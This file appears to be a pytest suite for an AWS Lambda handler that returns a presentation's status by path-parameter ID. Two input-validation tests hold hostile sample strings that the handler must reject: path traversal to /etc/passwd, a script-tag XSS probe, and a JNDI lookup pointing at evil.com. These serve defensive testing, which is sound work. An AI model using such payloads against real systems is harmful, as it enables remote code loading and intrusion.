"""
Unit tests for presentation_status Lambda function - Testing Task 30 Fix
测试GET /presentations/{id}应该从路径参数而不是查询参数获取ID

这些测试设计为在修复前失败，遵循TDD原则
测试覆盖：
1. 路径参数正确传递和获取
2. 无效ID返回400错误  
3. 不存在的presentation返回404
4. DynamoDB错误处理
5. CORS头部正确设置
"""

import json
import pytest
from unittest.mock import Mock, patch, MagicMock
import sys
import os
import uuid
from datetime import datetime, timezone
from botocore.exceptions import ClientError

# 添加Lambda函数路径
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../lambdas/api'))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../lambdas'))

@pytest.fixture
def lambda_context():
    """Mock Lambda context object."""
    context = Mock()
    context.function_name = 'presentation-status'
    context.memory_limit_in_mb = 512
    context.invoked_function_arn = 'arn:aws:lambda:us-east-1:123456789012:function:presentation-status'
    context.aws_request_id = 'test-request-' + str(uuid.uuid4())
    return context

@pytest.fixture
def valid_presentation_id():
    """Valid presentation UUID"""
    return str(uuid.uuid4())

@pytest.fixture
def mock_presentation_data(valid_presentation_id):
    """Mock presentation data from DynamoDB"""
    return {
        'presentation_id': valid_presentation_id,
        'status': 'content_generation',
        'created_at': datetime.now(timezone.utc).isoformat(),
        'updated_at': datetime.now(timezone.utc).isoformat(),
        'title': 'Test Presentation',
        'slide_count': 15,
        'slides_completed': 7,
        'metadata': {
            'topic': 'AI and ML',
            'audience': 'Engineers'
        }
    }

class TestPresentationStatusFix:
    """测试套件：验证presentation_status从路径参数获取ID（而不是查询参数）"""
    
    @patch('presentation_status.dynamodb')
    def test_get_presentation_by_path_parameter_success(self, mock_dynamodb, lambda_context, valid_presentation_id, mock_presentation_data):
        """
        测试1：通过路径参数正确获取演示文稿详情
        预期失败原因：当前实现可能从queryStringParameters获取ID
        修复后：应该从pathParameters获取presentation_id
        """
        # 设置DynamoDB mock
        mock_table = MagicMock()
        mock_dynamodb.Table.return_value = mock_table
        mock_table.get_item.return_value = {'Item': mock_presentation_data}
        
        from presentation_status import lambda_handler
        
        # 构造API Gateway事件 - ID在路径参数中
        event = {
            'pathParameters': {
                'presentationId': valid_presentation_id  # 路径参数
            },
            'queryStringParameters': None,  # 没有查询参数
            'httpMethod': 'GET',
            'resource': '/presentations/{presentationId}',
            'headers': {
                'Accept': 'application/json'
            }
        }
        
        result = lambda_handler(event, lambda_context)
        
        # 验证响应
        assert result['statusCode'] == 200, f"Expected 200, got {result['statusCode']}"
        
        body = json.loads(result['body'])
        assert body['success'] is True
        assert body['data']['task_id'] == valid_presentation_id
        assert body['data']['status'] == 'content_generation'
        assert body['data']['progress'] == 49  # 40 + int((7/15)*20) = 40 + int(9.333) = 49
        
        # 验证DynamoDB调用 - 使用正确的ID
        mock_table.get_item.assert_called_once_with(
            Key={'presentation_id': valid_presentation_id}
        )
        
        # 验证CORS头部
        assert 'headers' in result
        assert result['headers']['Access-Control-Allow-Origin'] == '*'
        
    @patch('presentation_status.dynamodb')
    def test_get_presentation_alternate_path_parameter(self, mock_dynamodb, lambda_context, valid_presentation_id, mock_presentation_data):
        """
        测试2：支持不同的路径参数名称（id vs presentationId）
        预期失败原因：函数可能只检查特定的参数名
        修复后：应该支持多种路径参数名称
        """
        mock_table = MagicMock()
        mock_dynamodb.Table.return_value = mock_table
        mock_table.get_item.return_value = {'Item': mock_presentation_data}
        
        from presentation_status import lambda_handler
        
        # 使用简单的'id'作为路径参数名
        event = {
            'pathParameters': {
                'id': valid_presentation_id  # 简单的id参数
            },
            'queryStringParameters': None,
            'httpMethod': 'GET',
            'resource': '/presentations/{id}'
        }
        
        result = lambda_handler(event, lambda_context)
        
        assert result['statusCode'] == 200
        body = json.loads(result['body'])
        assert body['data']['task_id'] == valid_presentation_id
        
    @patch('presentation_status.dynamodb')
    def test_invalid_presentation_id_returns_400(self, mock_dynamodb, lambda_context):
        """
        测试3：无效的presentation_id格式返回400错误
        预期失败原因：当前可能没有验证UUID格式
        修复后：应该验证ID格式并返回适当错误
        """
        from presentation_status import lambda_handler
        
        invalid_ids = [
            'not-a-uuid',
            '123',
            'abc-def-ghi',
            '',
            '   ',
            'null',
            '../etc/passwd'  # 路径遍历尝试
        ]
        
        for invalid_id in invalid_ids:
            event = {
                'pathParameters': {
                    'presentationId': invalid_id
                },
                'queryStringParameters': None,
                'httpMethod': 'GET'
            }
            
            result = lambda_handler(event, lambda_context)
            
            assert result['statusCode'] == 400, f"Expected 400 for ID '{invalid_id}', got {result['statusCode']}"
            body = json.loads(result['body'])
            assert body['success'] is False
            assert 'error' in body
            assert body['error']['code'] in ['VALIDATION_ERROR', 'INVALID_REQUEST']
            
    @patch('presentation_status.dynamodb')
    def test_missing_path_parameter_returns_400(self, mock_dynamodb, lambda_context):
        """
        测试4：缺少路径参数返回400错误
        预期失败原因：可能没有正确处理缺失参数
        修复后：应该返回明确的错误消息
        """
        from presentation_status import lambda_handler
        
        # 没有路径参数的事件
        event = {
            'pathParameters': None,
            'queryStringParameters': None,
            'httpMethod': 'GET'
        }
        
        result = lambda_handler(event, lambda_context)
        
        assert result['statusCode'] == 400
        body = json.loads(result['body'])
        assert body['success'] is False
        assert 'required' in body['error']['message'].lower()
        
    @patch('presentation_status.dynamodb')
    def test_presentation_not_found_returns_404(self, mock_dynamodb, lambda_context, valid_presentation_id):
        """
        测试5：不存在的presentation返回404错误
        预期失败原因：当前实现可能返回不同的状态码
        修复后：应该返回标准的404响应
        """
        mock_table = MagicMock()
        mock_dynamodb.Table.return_value = mock_table
        # DynamoDB返回空结果
        mock_table.get_item.return_value = {}
        
        from presentation_status import lambda_handler
        
        event = {
            'pathParameters': {
                'presentationId': valid_presentation_id
            },
            'queryStringParameters': None,
            'httpMethod': 'GET'
        }
        
        result = lambda_handler(event, lambda_context)
        
        assert result['statusCode'] == 404
        body = json.loads(result['body'])
        assert body['success'] is False
        assert body['error']['code'] == 'NOT_FOUND'
        assert 'not found' in body['error']['message'].lower()
        assert body['error']['details']['task_id'] == valid_presentation_id
        
    @patch('presentation_status.dynamodb')
    def test_dynamodb_error_handling(self, mock_dynamodb, lambda_context, valid_presentation_id):
        """
        测试6：DynamoDB错误处理
        预期失败原因：可能没有适当的错误处理
        修复后：应该优雅地处理DynamoDB错误
        """
        mock_table = MagicMock()
        mock_dynamodb.Table.return_value = mock_table
        
        # 模拟DynamoDB错误
        mock_table.get_item.side_effect = ClientError(
            {'Error': {'Code': 'ResourceNotFoundException', 'Message': 'Table not found'}},
            'GetItem'
        )
        
        from presentation_status import lambda_handler
        
        event = {
            'pathParameters': {
                'presentationId': valid_presentation_id
            },
            'queryStringParameters': None,
            'httpMethod': 'GET'
        }
        
        result = lambda_handler(event, lambda_context)
        
        assert result['statusCode'] == 500
        body = json.loads(result['body'])
        assert body['success'] is False
        assert body['error']['code'] == 'INTERNAL_ERROR'
        
    @patch('presentation_status.dynamodb')
    def test_cors_headers_always_present(self, mock_dynamodb, lambda_context, valid_presentation_id):
        """
        测试7：CORS头部在所有响应中都正确设置
        预期失败原因：错误响应可能缺少CORS头部
        修复后：所有响应都应包含CORS头部
        """
        from presentation_status import lambda_handler
        
        test_cases = [
            # 成功场景
            {
                'setup': lambda table: setattr(table, 'get_item', MagicMock(return_value={'Item': {'presentation_id': valid_presentation_id, 'status': 'completed'}})),
                'expected_status': 200
            },
            # 404场景
            {
                'setup': lambda table: setattr(table, 'get_item', MagicMock(return_value={})),
                'expected_status': 404
            },
            # 错误场景
            {
                'setup': lambda table: setattr(table.get_item, 'side_effect', Exception('DB Error')),
                'expected_status': 500
            }
        ]
        
        for test_case in test_cases:
            mock_table = MagicMock()
            mock_dynamodb.Table.return_value = mock_table
            test_case['setup'](mock_table)
            
            event = {
                'pathParameters': {'presentationId': valid_presentation_id},
                'queryStringParameters': None,
                'httpMethod': 'GET'
            }
            
            result = lambda_handler(event, lambda_context)
            
            assert result['statusCode'] == test_case['expected_status']
            assert 'headers' in result
            assert 'Access-Control-Allow-Origin' in result['headers']
            assert 'Access-Control-Allow-Methods' in result['headers']
            assert 'Access-Control-Allow-Headers' in result['headers']
            
    @patch('presentation_status.dynamodb')
    def test_progress_calculation_for_different_statuses(self, mock_dynamodb, lambda_context, valid_presentation_id):
        """
        测试8：不同状态的进度计算
        预期失败原因：进度计算可能不准确
        修复后：应该正确计算各种状态的进度
        """
        mock_table = MagicMock()
        mock_dynamodb.Table.return_value = mock_table
        
        from presentation_status import lambda_handler
        
        test_statuses = [
            ('pending', {}, 0),
            ('outlining', {}, 20),
            ('content_generation', {'slide_count': 10, 'slides_completed': 5}, 50),
            ('image_generation', {'images_total': 8, 'images_completed': 4}, 70),
            ('compiling', {}, 80),
            ('completed', {}, 100),
            ('failed', {'progress': 45}, 45)
        ]
        
        for status, extra_data, expected_progress in test_statuses:
            presentation_data = {
                'presentation_id': valid_presentation_id,
                'status': status,
                **extra_data
            }
            mock_table.get_item.return_value = {'Item': presentation_data}
            
            event = {
                'pathParameters': {'presentationId': valid_presentation_id},
                'queryStringParameters': None,
                'httpMethod': 'GET'
            }
            
            result = lambda_handler(event, lambda_context)
            
            assert result['statusCode'] == 200, f"Failed for status: {status}"
            body = json.loads(result['body'])
            assert body['data']['progress'] == expected_progress, f"Wrong progress for status {status}: expected {expected_progress}, got {body['data']['progress']}"
            
    @patch('presentation_status.dynamodb')
    def test_completed_presentation_includes_download_info(self, mock_dynamodb, lambda_context, valid_presentation_id):
        """
        测试9：完成的演示文稿包含下载信息
        预期失败原因：可能缺少完整的下载信息
        修复后：应该包含所有必要的下载链接和格式
        """
        mock_table = MagicMock()
        mock_dynamodb.Table.return_value = mock_table
        
        completed_presentation = {
            'presentation_id': valid_presentation_id,
            'status': 'completed',
            'title': 'Test Presentation',
            'slide_count': 20,
            'file_size': 2048000,
            'pptx_key': f'presentations/{valid_presentation_id}/presentation.pptx',
            'pdf_key': f'presentations/{valid_presentation_id}/presentation.pdf',
            'created_at': datetime.now(timezone.utc).isoformat(),
            'completed_at': datetime.now(timezone.utc).isoformat()
        }
        mock_table.get_item.return_value = {'Item': completed_presentation}
        
        from presentation_status import lambda_handler
        
        event = {
            'pathParameters': {'presentationId': valid_presentation_id},
            'queryStringParameters': None,
            'httpMethod': 'GET'
        }
        
        result = lambda_handler(event, lambda_context)
        
        assert result['statusCode'] == 200
        body = json.loads(result['body'])
        
        # 验证结果包含下载信息
        assert 'data' in body
        data = body['data']
        assert data['status'] == 'completed'
        assert 'result' in data
        
        result_info = data['result']
        assert result_info['presentation_id'] == valid_presentation_id
        assert result_info['slide_count'] == 20
        assert result_info['file_size'] == 2048000
        assert 'download_url' in result_info
        assert f'/presentations/{valid_presentation_id}/download' in result_info['download_url']
        assert 'formats' in result_info
        assert 'pptx' in result_info['formats']
        assert 'pdf' in result_info['formats']
        
        # 验证链接
        assert '_links' in data
        assert 'download' in data['_links']
        
    @patch('presentation_status.dynamodb')
    def test_failed_presentation_includes_error_details(self, mock_dynamodb, lambda_context, valid_presentation_id):
        """
        测试10：失败的演示文稿包含错误详情
        预期失败原因：可能缺少详细的错误信息
        修复后：应该包含完整的错误详情
        """
        mock_table = MagicMock()
        mock_dynamodb.Table.return_value = mock_table
        
        failed_presentation = {
            'presentation_id': valid_presentation_id,
            'status': 'failed',
            'error_message': 'Failed to generate content: Rate limit exceeded',
            'error_code': 'RATE_LIMIT_ERROR',
            'error_timestamp': datetime.now(timezone.utc).isoformat(),
            'progress': 35
        }
        mock_table.get_item.return_value = {'Item': failed_presentation}
        
        from presentation_status import lambda_handler
        
        event = {
            'pathParameters': {'presentationId': valid_presentation_id},
            'queryStringParameters': None,
            'httpMethod': 'GET'
        }
        
        result = lambda_handler(event, lambda_context)
        
        assert result['statusCode'] == 200
        body = json.loads(result['body'])
        
        data = body['data']
        assert data['status'] == 'failed'
        assert data['progress'] == 35
        assert 'error' in data
        
        error_info = data['error']
        assert error_info['message'] == 'Failed to generate content: Rate limit exceeded'
        assert error_info['code'] == 'RATE_LIMIT_ERROR'
        assert 'timestamp' in error_info


class TestEdgeCasesAndBoundaries:
    """边界条件和异常场景测试"""
    
    @patch('presentation_status.dynamodb')
    def test_concurrent_status_requests(self, mock_dynamodb, lambda_context, valid_presentation_id):
        """
        测试11：并发状态查询请求
        预期失败原因：可能存在竞态条件
        修复后：应该正确处理并发请求
        """
        mock_table = MagicMock()
        mock_dynamodb.Table.return_value = mock_table
        
        # 模拟状态在请求过程中变化
        call_count = [0]
        def dynamic_response(*args, **kwargs):
            call_count[0] += 1
            statuses = ['outlining', 'content_generation', 'completed']
            return {
                'Item': {
                    'presentation_id': valid_presentation_id,
                    'status': statuses[min(call_count[0] - 1, 2)]
                }
            }
        
        mock_table.get_item.side_effect = dynamic_response
        
        from presentation_status import lambda_handler
        
        # 模拟多个并发请求
        for _ in range(3):
            event = {
                'pathParameters': {'presentationId': valid_presentation_id},
                'queryStringParameters': None,
                'httpMethod': 'GET'
            }
            
            result = lambda_handler(event, lambda_context)
            assert result['statusCode'] == 200
            
    @patch('presentation_status.dynamodb')
    def test_very_long_presentation_id(self, mock_dynamodb, lambda_context):
        """
        测试12：超长presentation_id处理
        预期失败原因：可能没有长度限制
        修复后：应该验证ID长度
        """
        from presentation_status import lambda_handler
        
        # 创建一个超长但仍是有效UUID格式的ID
        long_id = str(uuid.uuid4()) * 10  # 360字符
        
        event = {
            'pathParameters': {'presentationId': long_id},
            'queryStringParameters': None,
            'httpMethod': 'GET'
        }
        
        result = lambda_handler(event, lambda_context)
        
        assert result['statusCode'] == 400
        body = json.loads(result['body'])
        assert body['success'] is False
        
    @patch('presentation_status.dynamodb')
    def test_special_characters_in_path(self, mock_dynamodb, lambda_context):
        """
        测试13：路径参数中的特殊字符处理
        预期失败原因：可能没有适当的输入清理
        修复后：应该安全处理特殊字符
        """
        from presentation_status import lambda_handler
        
        special_ids = [
            '../../etc/passwd',
            '<script>alert("xss")</script>',
            'SELECT * FROM presentations',
            '${jndi:ldap://evil.com/a}',
            '%00null',
            '\\x00\\x01\\x02'
        ]
        
        for special_id in special_ids:
            event = {
                'pathParameters': {'presentationId': special_id},
                'queryStringParameters': None,
                'httpMethod': 'GET'
            }
            
            result = lambda_handler(event, lambda_context)
            
            # 应该安全地拒绝这些输入
            assert result['statusCode'] == 400, f"Should reject special ID: {special_id}"
            body = json.loads(result['body'])
            assert body['success'] is False


class TestPerformanceAndOptimization:
    """性能和优化测试"""
    
    @patch('presentation_status.dynamodb')
    def test_response_time_under_threshold(self, mock_dynamodb, lambda_context, valid_presentation_id, mock_presentation_data):
        """
        测试14：响应时间在阈值内
        预期失败原因：可能存在性能问题
        修复后：应该在100ms内响应
        """
        import time
        
        mock_table = MagicMock()
        mock_dynamodb.Table.return_value = mock_table
        mock_table.get_item.return_value = {'Item': mock_presentation_data}
        
        from presentation_status import lambda_handler
        
        event = {
            'pathParameters': {'presentationId': valid_presentation_id},
            'queryStringParameters': None,
            'httpMethod': 'GET'
        }
        
        start_time = time.time()
        result = lambda_handler(event, lambda_context)
        end_time = time.time()
        
        response_time_ms = (end_time - start_time) * 1000
        
        assert result['statusCode'] == 200
        assert response_time_ms < 100, f"Response took {response_time_ms}ms, should be under 100ms"
        
    @patch('presentation_status.dynamodb')
    def test_minimal_dynamodb_calls(self, mock_dynamodb, lambda_context, valid_presentation_id, mock_presentation_data):
        """
        测试15：最小化DynamoDB调用
        预期失败原因：可能有多余的数据库调用
        修复后：应该只调用一次DynamoDB
        """
        mock_table = MagicMock()
        mock_dynamodb.Table.return_value = mock_table
        mock_table.get_item.return_value = {'Item': mock_presentation_data}
        
        from presentation_status import lambda_handler
        
        event = {
            'pathParameters': {'presentationId': valid_presentation_id},
            'queryStringParameters': None,
            'httpMethod': 'GET'
        }
        
        result = lambda_handler(event, lambda_context)
        
        assert result['statusCode'] == 200
        # 验证只调用了一次DynamoDB
        assert mock_table.get_item.call_count == 1, f"DynamoDB called {mock_table.get_item.call_count} times, should be 1"


# 运行测试的辅助函数
if __name__ == "__main__":
    pytest.main([__file__, '-v', '--tb=short'])